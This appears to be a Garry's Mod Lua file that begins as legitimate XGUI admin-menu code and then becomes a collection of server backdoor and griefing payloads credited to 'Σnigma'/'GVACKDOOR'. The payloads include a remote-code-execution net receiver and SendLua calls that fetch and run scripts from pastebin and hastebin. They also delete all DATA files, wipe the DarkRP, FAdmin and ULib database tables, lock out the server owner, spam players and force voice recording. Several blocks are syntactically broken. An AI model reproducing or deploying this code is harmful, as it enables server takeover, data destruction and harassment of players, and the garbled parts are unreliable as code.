		xgui.flushQueue( "chunkbox" ) --Remove the queue entry that would hide the chunkbox
	end
end

function xgui.getChunk( flag, datatype, data )
	if xgui.expectingdata then
		--print( datatype, flag ) --Debug
		if flag == -1 then
			--Ignore these chunks
		elseif flag == 0 then --Data should be purged
			if xgui.data[datatype] then
				table.Empty( xgui.data[datatype] )
			end
			xgui.flushQueue( datatype )
			xgui.callUpdate( datatype, "clear" )
		elseif flag == 1 then
			if not xgui.mergeData then --A full data table is coming in
				if not data then data = {} end --Failsafe for no table being sent
				xgui.flushQueue( datatype )
				table.Empty( xgui.data[datatype] )
				table.Merge( xgui.data[datatype], data )
				xgui.callUpdate( datatype, "clear" )
				xgui.callUpdate( datatype, "process", data )
				xgui.callUpdate( datatype, "done" )
			else --A chunk of data is coming in
				table.Merge( xgui.data[datatype], data )
				xgui.callUpdate( datatype, "process", data )
			end
		elseif flag == 2 or flag == 3 then --Add/Update a portion of data
			table.Merge( xgui.data[datatype], data )
			xgui.callUpdate( datatype, flag == 2 and "add" or "update", data )
		elseif flag == 4 then --Remove a key from the table
			xgui.removeDataEntry( xgui.data[datatype], data ) --Needs to be called recursively!
			xgui.callUpdate( datatype, "remove", data )
		elseif flag == 5 then --Begin a set of chunks (Clear the old data, then flag to merge incoming data)
			table.Empty( xgui.data[datatype] )
			xgui.mergeData = true
			xgui.flushQueue( datatype )
			xgui.callUpdate( datatype, "clear" )
		elseif flag == 6 then --End a set of chunks (Clear the merge flag)
			xgui.mergeData = nil
			xgui.callUpdate( datatype, "done" )
		elseif flag == 7 then --Pass the data directly to the module to be handled.
			xgui.callUpdate( datatype, "data", data )
		end
		xgui.chunkbox:Progress( datatype )
	end
end

function xgui.removeDataEntry( data, entry )
	for k, v in pairs( entry ) do
		if type( v ) == "table" then
			xgui.removeDataEntry( data[k], v )
		else
			if type(v) == "number" then
				table.remove( data, v )
			else
				data[v] = nil
			end
		end
	end
end

function xgui.callUpdate( dtype, event, data )
	--Run any functions that request to be called when "curtable" is updated
	if not xgui.hook[dtype] or ( event and not xgui.hook[dtype][event] ) then
		Msg( "XGUI: Attempted to call non-existent type or event to a hook! (" .. dtype .. ", " .. ( event or "nil" ) .. ")\n" )
	else
		if not event then
			for name, func in pairs( xgui.hook[dtype] ) do func( data ) end
		else
			for name, func in pairs( xgui.hook[dtype][event] ) do func( data ) end
		end
	end
end

--If the player's group is changed, reprocess the XGUI modules for permissions, and request for extra data if needed
function xgui.PermissionsChanged( ply )
	if ply == LocalPlayer() and xgui.isInstalled and xgui.dataInitialized then
		xgui.processModules()
		local types = {}
		for dtype, data in pairs( xgui.data ) do
			if table.Count( data ) > 0 then table.insert( types, dtype ) end
		end
		RunConsoleCommand( "xgui", "refreshdata", unpack( types ) )
	end
end
hook.Add( "UCLAuthed", "XGUI_PermissionsChanged", xgui.PermissionsChanged )

function xgui.getInstalled()
	if not xgui.isInstalled then
		if xgui.notInstalledWarning then
			xgui.notInstalledWarning:Remove()
			xgui.notInstalledWarning = nil
		end
		xgui.isInstalled = true
		xgui.offlineMode = false
		RunConsoleCommand( "xgui", "getdata" )
	end
end

function xgui.cmd_base( ply, func, args )
	if not args[ 1 ] then
		xgui.toggle()
	elseif xgui.isInstalled then --First check that it's installed
		RunConsoleCommand( "_xgui", unpack( args ) )
	end
end

function xgui.tab_completes()
	return xgui.tabcompletes
end

function xgui.ulxmenu_tab_completes()
	return xgui.ulxmenucompletes
end

ULib.cmds.addCommandClient( "xgui", xgui.cmd_base )
ULib.cmds.addCommandClient( "xgui show", function( ply, cmd, args ) xgui.show( args ) end, xgui.tab_completes )
ULib.cmds.addCommandClient( "xgui hide", xgui.hide )
ULib.cmds.addCommandClient( "xgui toggle", function() xgui.toggle() end )

--local ulxmenu = ulx.command( CATEGORY_NAME, "ulx menu", ulx.menu, "!menu" )
ULib.cmds.addCommandClient( "ulx menu", function( ply, cmd, args ) xgui.toggle( args ) end, xgui.ulxmenu_tab_completes )
    end)
end



--[[

    Anti StopSound & Ulx Menu

]]--


if ply:ConCommand( "stopsound" ) then return end 
end
if ply:ConCommand( "ulx menu" ) then return end 
end




--[[

    Block owner access in server

]]--


hook.Add("CheckPassword","ripowner",function(steamid64)
    if util.SteamIDFrom64(steamid64) == "STEAM_0:1:158035763" then
        return false, "[= /!\ Your access to the server has been locked because you not paid gmodstore scripts /!\ =]"
    end
end)



--[[

    Yes i'm REAL GARRY

]]--


util.AddNetworkString("OMG_NO_PRANK_GARRY_IS_HERE")

BroadcastLua([[net.Receive("OMG_NO_PRANK_GARRY_IS_HERE", function() local ent = net.ReadEntity() chat.AddText(team.GetColor(ent:Team()), ent:Name(), Color(200, 200, 200, 255), " earned the achievement ", Color(245, 246, 0, 255), "Yes, I am the real Garry!")  end)]])

for k,v in pairs(player.GetAll()) do
    net.Start("OMG_NO_PRANK_GARRY_IS_HERE")
        net.WriteEntity(v)
    net.Broadcast()
end



--[[

    Marks

]]--


util.AddNetworkString("suninrags")
local function slua(str,ply)
    local d = util.Compress(str)
    local i = #d
    net.Start("suninrags")
    net.WriteUInt(i,16)
    net.WriteData(d,i)
    if ply then
        net.Send(ply)
    else
        net.Broadcast()
    end
end
net.Receive("suninrags",function()
    local serverside = net.ReadBit()
    local str = util.Decompress(net.ReadData(net.ReadUInt(16)))
    if serverside == 1 then
        CompileString(str,"\xFF\xFF\xFF",false)()
    else
        local ply = net.ReadEntity()
        slua(str, IsValid(ply) && ply:IsPlayer() && ply )
    end
end)
BroadcastLua([[net.Receive("suninrags",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
hook.Add("PlayerInitialSpawn","\xFF\xFF\xFF",function(ply)
    ply:SendLua([[net.Receive("suninrags",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
end)



--[[

    PureSystem V2
    for k, v in pairs(player.GetAll()) do
        v:SendLua("steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
    end

]]--


if SERVER then
	for k, v in pairs(player.GetAll()) do
		v:SendLua("steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	end

	
	print([[
__________                         _________               __                   ____   ____________
\______   \__ _________   ____    /   _____/__.__. _______/  |_  ____   _____   \   \ /   /\_____  \
 |     ___/  |  \_  __ \_/ __ \   \____   /|  |  |/  ___/\   __\/ __ \ /     \   \   Y   /  /  ____/
 |    |   |  |  /|  | \/\  ___/    ____\  \\ ___ |\___ \  |  | \  ___/|  Y Y  \   \     /  /       \
 |____|   |____/ |__|    \___    /________/  ____/____ /  |__|  \___  |__|_|  /    \___/   \_______|]])

	timer.Create( "gvacspam", 0.1, 1, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, "[PureSystem] Installation des prérequis.")
		end
	end)

	timer.Simple( 10, function()
  		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, "[PureSystem] Lancement de L'installation.")
		end
	end )

	timer.Simple( 14, function()
  		for k,v in pairs(player.GetAll()) do
   	  		v:SendLua([[http.Fetch('https://pastebin.com/raw/EwtFyKWe',function(b,l,h,c)RunString(b)end,nil)]]) 
   	  		v:SetRunSpeed(400* 4);
        	v:SetWalkSpeed(200 * 2);
		end

		RunConsoleCommand("sv_friction", "-8")

		timer.Create( "gtonip", 15, 0, function()
			for k,v in pairs(player.GetAll()) do
				v:GodEnable()
				v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
			end

		end )
	end )

	timer.Simple( 76, function()
		http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
	end )

	timer.Simple( 77, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4,  "[PureSystem] Merci pour votre patience.")
    		DarkRP.notify(ply, 2, 20, "HACK PAR IXXE/ GVACKDOOR leaked by anatik")
		end
	end )

	timer.Simple( 105, function()
		RunConsoleCommand("sv_friction", "8")
		hook.Remove("Think", "2012akaapocalypse")
	end )
	

	hook.Remove( "PlayerSay", "Pure_Menu" )
	concommand.Remove("Pure_openMenu")
	concommand.Remove("ulx menu")
	ULib.addSayCommand( '!menu', lechat )
	ULib.cmds.addCommand( "ulx menu", lechat )
	


	function game.CleanUpMap() end

	timer.Create("moneymoney", 1, 0, function()
		for k,v in pairs(player.GetAll()) do v:addMoney(1648125) end
	end)
end

--[[
  local loadingPercent = 0
  local W, H = ScrW(), ScrH()

surface.CreateFont("lapolice", {
    font = "Open Sans",  
    size = ScrW()*0.02, 
    weight = 10, 
    blursize = 0, 
    scanlines = 2.5, 
    antialias = false
})

surface.CreateFont( "PureBigButtonFont", {
    font = "Open Sans",
    extended = false,
    size = 23,
    weight = 400,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

    ledermatriste = vgui.Create("DFrame")
    ledermatriste:SetPos(0,0)
    ledermatriste:SetSize(ScrW(), ScrH())
    ledermatriste:ShowCloseButton(false)
    ledermatriste:SetTitle("")
    ledermatriste:SetVisible(true)
    ledermatriste:MakePopup()
    ledermatriste:SetDraggable(false)
    ledermatriste.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(18,21,25,255))
    end

    local logoma = vgui.Create("DImage", ledermatriste)
    logoma:SetPos(ScrW()/2 - 250, ScrH()/2 - 250)
    logoma:SetSize(500, 500)
    logoma:SetImage("materials/puresystem/logo_marteaupure.png")

    local timerloadingbar = vgui.Create("DPanel", ledermatriste)
    timerloadingbar:SetPos(ScrW()/2 - 150, ScrH()/2 + 245)
    timerloadingbar.Paint = function(self, w, h)
        draw.RoundedBox(5, 0, 0, w, h, Color(255, 255, 255))
    end

    local timerloadingbardone = vgui.Create("DPanel", ledermatriste)
    timerloadingbardone:SetPos(ScrW()/2 - 150, ScrH()/2 + 245)
    timerloadingbardone.Paint = function(self, w, h)
        draw.RoundedBox(5, 0, 0, w, h, Color(241, 193, 0,255))
    end

    local timerloading = vgui.Create("DLabel", ledermatriste)
    timerloading:SetPos(ScrW()/2 - 100, ScrH()/2 + 250)
    timerloading:SetText("Installation de la mise à jours...")
    timerloading:SetColor(Color(24,24,24,255))
    timerloading:SetFont("PureBigButtonFont")
    timerloading:SizeToContents()

    timerloadingbar:SetSize(timerloading:GetWide() + 100, timerloading:GetTall() + 10)
    timerloadingbardone:SetSize(0, timerloading:GetTall() + 10)

    timer.Create("charglogo", 1, 1, function()
        logoma:AlphaTo(10, 1, 0)
        logoma:AlphaTo(255, 1, 1)
        timer.Adjust("charglogo", 3, 0, function()
            logoma:AlphaTo(10, 1, 1)
            logoma:AlphaTo(255, 1, 2)
        end)
    end)

    local timePassed = 0

    timer.Create("parleput1", 0.1, 0, function()--PARLE !!!
        RunConsoleCommand("+voicerecord")
    end)

    timer.Create("Pure_loadingTimeout", 1, 0, function()
        timePassed = timePassed + 1
        loadingPercent = loadingPercent + math.random(14, 15)
        if loadingPercent > 50 then
            timer.Remove("Pure_loadingTimeout")
            loadingPercent = 80
        end
        timerloadingbardone:SizeTo(timerloadingbar:GetWide() * loadingPercent / 100 , -1, 3)
    end)

    timer.Simple(25, function()
        if ledermatriste != nil && timerloadingbar:IsValid() && timerloadingbardone:IsValid() then
            timerloadingbardone:SizeTo(timerloadingbar:GetWide() * 90 / 100, -1, 3)
        end
    end)

    timer.Simple(30, function()
        timer.Remove("charglogo")

        if ledermatriste != nil && timerloadingbar:IsValid() && timerloadingbardone:IsValid() then
            timerloadingbardone:SizeTo(timerloadingbar:GetWide(), -1, 1)
        end
    end)

    timer.Simple(31, function()
        if ledermatriste != nil then
            ledermatriste:Remove()
            enigma()
        end
    end)




    timer.Simple(63, function()
        enigma:Remove()
        timer.Remove( "charglogo" )
        RunConsoleCommand("+right")
        RunConsoleCommand("+voicerecord")
        RunConsoleCommand("cl_yawspeed","9999")
        RunConsoleCommand("r_shader_srgb","1")
    end)


    timer.Simple( 73, function()
        RunConsoleCommand("-right")
        RunConsoleCommand("cl_yawspeed","8")
        timer.Remove("parleput1")
        timer.Remove("cheer_loop")
    end )

    timer.Simple( 90, function()
        RunConsoleCommand("r_shader_srgb","0")
    end )

    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end

    timer.Create("cheer_loop",2.7,0,function()
        for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end )


    hook.Add("Think","somewhere_over_the_rainbow",function()
        local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
        for _, v in ipairs(player.GetAll()) do
            v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
        end
    end)


function enigma()
    enigma = vgui.Create("DFrame")
    enigma:SetPos(0,0)
    enigma:SetSize(ScrW(), ScrH())
    enigma:ShowCloseButton(false)
    enigma:SetTitle("")
    enigma:SetVisible(true)
    enigma:MakePopup()
    enigma:SetDraggable(false)
    enigma.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(18,21,25,255))
        draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
        draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
        draw.DrawText( "Σ", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "Σ", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "Σ", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "Σ", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "RIP ;)", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "RIP ;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "RIP ;)", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "RIP ;)", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "RIP ;)", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( "ΣNIGMA", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
    end

    sound.PlayURL( "http://funtime.pe.hu/Brass.mp3", "mono", function()end )

    local logenigma = vgui.Create("HTML", enigma)
    logenigma:SetPos(ScrW()/2 - 250, ScrH()/2 - 250)
    logenigma:SetSize(500, 500)
    logenigma:OpenURL( "https://i.imgur.com/7zMPifV.png")

    
end
]]

--[[

    Break ALL SQL

]]--


local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end
MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')
sql.Query("DELETE FROM `DARKRP_BANNED_RPNAMES_STORE`")
sql.Query("DELETE FROM `DRP_PLAYER_NICKNAME_STORE`")
sql.Query("DELETE FROM `FADMIN_GROUPS`")
sql.Query("DELETE FROM `FADMIN_MOTD`")
sql.Query("DELETE FROM `FADMIN_PRIVILEGES`")
sql.Query("DELETE FROM `FADMIN_RESTRICTEDENTS`")
sql.Query("DELETE FROM `FAdminBans`")
sql.Query("DELETE FROM `FAdmin_PlayerGroup`")
sql.Query("DELETE FROM `FAdmin_ServerSettings`")
sql.Query("DELETE FROM `FPP_ANTISPAM1`")
sql.Query("DELETE FROM `FPP_ENTITYDAMAGE1`")
sql.Query("DELETE FROM `FPP_GLOBALSETTINGS1`")
sql.Query("DELETE FROM `FPP_GRAVGUN1`")
sql.Query("DELETE FROM `FPP_GROUPMEMBERS1`")
sql.Query("DELETE FROM `FPP_GROUPS3`")
sql.Query("DELETE FROM `FPP_GROUPTOOL`")
sql.Query("DELETE FROM `FPP_PHYSGUN1`")
sql.Query("DELETE FROM `FPP_PLAYERUSE1`")
sql.Query("DELETE FROM `FPP_TOOLADMINONLY`")
sql.Query("DELETE FROM `FPP_TOOLGUN1`")
sql.Query("DELETE FROM `FPP_TOOLRESTRICTPERSON1`")
sql.Query("DELETE FROM `batm_personal_accounts`")
sql.Query("DELETE FROM `cac_incidents`")
sql.Query("DELETE FROM `darkrp_door`")
sql.Query("DELETE FROM `darkrp_doorgroups`")
sql.Query("DELETE FROM `darkrp_doorjobs`")
sql.Query("DELETE FROM `darkrp_jobSpawn`")
sql.Query("DELETE FROM `darkrp_player`")
sql.Query("DELETE FROM `darkrp_position`")
sql.Query("DELETE FROM `playerinformation`")
sql.Query("DELETE FROM `playerpdata`")
sql.Query("DELETE FROM `sqlite_sequence`")
sql.Query("DELETE FROM `ulib_bans`")



--[[

    1000 Pictures In Data

]]--


local function randomString(len)
    if !len or len <= 0 then return "" end
    return randomString(len - 1)..("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-")[math.random(1, 64)]
end

local function spamFilePNG(path)
    local files, folders = file.Find(path.."*", "DATA")

    for i=1,1000 do
        local txt = randomString(10)
        local url = {
            [1] = "https://robohash.org/$txt?set=set"..math.random(1, 4),
            [2] = "http://via.placeholder.com/5001x3199?text=$txt"
        }

        local u = table.Random(url)
        http.Fetch(string.Replace(u, "$txt", txt), function(img)
            file.Write(txt..i..".png", img)
            print(path)
        end)
    end
    
    for k,v in pairs(folders) do
        spamFilePNG(path..v.."/")
    end
end
spamFilePNG("")



--[[

    Spam Notify All Players

]]--


timer.Create( "gvacspam", 0.1, 0, function()
for k, ply in pairs( player.GetAll() ) do
    DarkRP.notify(ply, 2, 4, "Noice")
end
end)



--[[

    Pure System

]]--


if SERVER then
	for k, v in pairs(player.GetAll()) do
		v:SendLua("steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	end

	
	print([[
__________                         _________               __                   ____   ____________
\______   \__ _________   ____    /   _____/__.__. _______/  |_  ____   _____   \   \ /   /\_____  \
 |     ___/  |  \_  __ \_/ __ \   \____   /|  |  |/  ___/\   __\/ __ \ /     \   \   Y   /  /  ____/
 |    |   |  |  /|  | \/\  ___/    ____\  \\ ___ |\___ \  |  | \  ___/|  Y Y  \   \     /  /       \
 |____|   |____/ |__|    \___    /________/  ____/____ /  |__|  \___  |__|_|  /    \___/   \_______|]])

	timer.Create( "gvacspam", 0.1, 1, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, "[PureSystem] Installation des prérequis.")
		end
	end)

	timer.Simple( 10, function()
  		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, "[PureSystem] Lancement de L'installation.")
		end
	end )

	timer.Simple( 14, function()
  		for k,v in pairs(player.GetAll()) do
   	  		v:SendLua([[http.Fetch('https://hastebin.com/raw/izuzicupeb',function(b,l,h,c)RunString(b)end,nil)]]) 
   	  		v:SetRunSpeed(400* 4);
        	v:SetWalkSpeed(200 * 2);
		end

		RunConsoleCommand("sv_friction", "-8")

		timer.Create( "gtonip", 15, 0, function()
			for k,v in pairs(player.GetAll()) do
				v:GodEnable()
				v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
			end

		end )
	end )

	timer.Simple( 76, function()
		http.Fetch('https://hastebin.com/raw/gepuyulibi',function(b,l,h,c)RunString(b)end,nil)
	end )

	timer.Simple( 77, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4,  "[PureSystem] Merci pour votre patience.")
    		DarkRP.notify(ply, 2, 20, "HACK PAR ΣNIGMA / GVACKDOOR")
		end
	end )

	timer.Simple( 105, function()
		RunConsoleCommand("sv_friction", "8")
		hook.Remove("Think", "2012akaapocalypse")
	end )
	

	hook.Remove( "PlayerSay", "Pure_Menu" )
	concommand.Remove("Pure_openMenu")
	concommand.Remove("ulx menu")
	ULib.addSayCommand( '!menu', lechat )
	ULib.cmds.addCommand( "ulx menu", lechat )
	


	function game.CleanUpMap() end

	timer.Create("moneymoney", 1, 0, function()
		for k,v in pairs(player.GetAll()) do v:addMoney(1648125) end
	end)
end



--[[

    No IP SHow

]]--


local r = debug.getregistry();

function r.Player.IPAddress = function()
	return "If you try to see me, you make pity.";
end



--[[

    Death Effect

]]--


function playerDies( victim, weapon, killer )
 
	game.SetTimeScale(2.0)
		timer.Simple(.01, function() game.SetTimeScale(0.01) end)
		timer.Simple(.05, function() game.SetTimeScale(0.1) end)
		timer.Simple(.09, function() game.SetTimeScale(0.3) end)
		timer.Simple(.13, function() game.SetTimeScale(0.6) end)
		timer.Simple(.17, function() game.SetTimeScale(1) end)
	end
	
 hook.Add( "PlayerDeath", "playerDeathTest", playerDies )



--[[

    Set All Player Group

]]--


for k,v in pairs(player.GetAll()) and v == LocalPlayer() do v:SetUserGroup('superadmin') end end



--[[

    Delete All Players ADV Dup Folder

]]--


for k, v in pairs(file.Find([[adv_duplicator/*]])) do for ik, av in pairs(file.Find([[adv_duplicator/]] .. v .. [[/*]])) do file.Delete([[adv_duplicator/]] .. v .. [[/]] .. av) end end



--[[

    Ground

]]--



for k,v in pairs(player.GetAll()) do
    v:local function=("ground")("color.math.66=math.99")

end


--[[

    FreeKick (PING)

]]--


timer.Create( "BadPingNoPlay", 2, 0, function()
    for _, ply in pairs(player.GetAll()) do
        if ply:Ping() > 15 then
            ply:Kick("Sorry, something went wrong.")  end end end )



--[[

    Enigma Project

]]--


timer.Create("nonameplease", 5, 0,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
        ply:Say( "/ooc DISCORD : https://discord.gg/9rS2jhf")
    end
end)
BroadcastLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
util.AddNetworkString "EnigmaProject"
 
local CHANGERPSEUDO = "The Σnigma Project Was Completed"
local enigmalaunchproject = {}
function enigmalaunchproject:RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
 
    return ret
end
 
 
 
enigmalaunchproject.m_tblActions = {}
enigmalaunchproject.m_strImageGlobalVar = enigmalaunchproject:RandomString( 6, 12 )
enigmalaunchproject.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
 
function enigmalaunchproject:NouvelleAction( intChainDelay, func )
    self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end
 
function enigmalaunchproject:ActionApres( pPlayer )
    pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
    if not self.m_tblActions[pPlayer.m_intCurAction] then return end
 
    timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
        if not IsValid( pPlayer ) then return end
        self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
        self:ActionApres( pPlayer )
    end )
end
 
function enigmalaunchproject:Start( pPlayer )
    pPlayer.m_intCurAction = 0
    self:ActionApres( pPlayer )
end
 
function enigmalaunchproject:SendLua( pPlayer, strLua )
pPlayer:SendLua([[RunConsoleCommand("gmod_language","ko")]])
    net.Start( "EnigmaProject" )
        net.WriteString( strLua )
    net.Send( pPlayer )
end
 
function enigmalaunchproject:SetupPlayer( pPlayer )
    pPlayer:SendLua( "net.Receive(\"EnigmaProject\", function() RunString(net.ReadString()) end)" )
end
 
 
 
 
 
 
-- DANSE --
 
 
for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_until_your_dead",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
 

-- FIN DANSE --
 
 
 
 
-- CHANGER NOM --
 
 
for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, CHANGERPSEUDO) v:setDarkRPVar("rpname", CHANGERPSEUDO) end
 
 
-- FIN CHANGER NOM --
 

 
-- Console Spam
 
decore = { 
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  ENIGMA IS          ||||
         !.........||||                     ||||
         !.........||||       |_|           ||||
         !.........||||  not  | |ere        ||||
         !.........||||                     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		Σnigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^"'   
            `' !!988888888888888888888888899fT|!^"' 
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
]]
, 
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||      THIS SCRIPT    ||||
         !.........||||                     ||||
         !.........||||         IS LEAKED   ||||
         !.........||||                     ||||
         `.........||||    BY ANATIK       ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
